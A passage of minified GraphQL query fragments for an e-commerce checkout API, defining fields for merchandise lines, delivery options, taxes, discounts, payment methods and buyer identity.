MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms deliveryPredictionEligible brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment ParentMerchandiseLine on MerchandiseLine{stableId lineAllocations{stableId __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}cartMetafields{...on CartMetafieldUpdateOperation{key namespace value type appId namespaceAppId valueType __typename}__typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}shopCashBalance{...on UnavailableTerms{__typename _singleInstance}...on FilledShopCashBalance{availableBalance{amount currencyCode __typename}__typename}...on PendingTerms{taskId pollDelay __typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress canUpdateDiscountCodes delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle crossBorder deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}displayIncentive}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on BankPaymentMethod{displayName orderingIndex paymentMethodIdentifier paymentProviderClientCredentials{apiClientKey merchantAccountId __typename}availableInstruments{bankName lastDigits shopifyPublicToken __typename}__typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded bwpItems merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{shopUser{publicId metafields{key namespace value type valueType __typename}__typename}customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired remote{...RemoteDetails __typename}__typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}metafieldRequests{namespace key __typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentInstrumentAccessorId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId payerApprovedAmount{amount currencyCode __typename}__typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name __typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment RemoteDetails on Remote{consolidated{taxes{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxesIncludedAmountInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}termsStatus __typename}totals{subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}delivery{deliveryMacros{id title amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTitle __typename}isShippingRequired termsStatus __typename}__typename}remoteNegotiations{shopId sessionToken errors{...ViolationDetails __typename}result{...on RemoteNegotiationResultAvailable{sellerProposal{...RemoteSellerProposalFragment __typename}buyerProposal{...RemoteBuyerProposalFragment __typename}__typename}...on RemoteNegotiationResultUnavailable{reason __typename}__typename}__typename}__typename}fragment ViolationDetails on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on RedirectRequiredViolation{target details __typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}fragment RemoteSellerProposalFragment on RemoteProposal{merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId 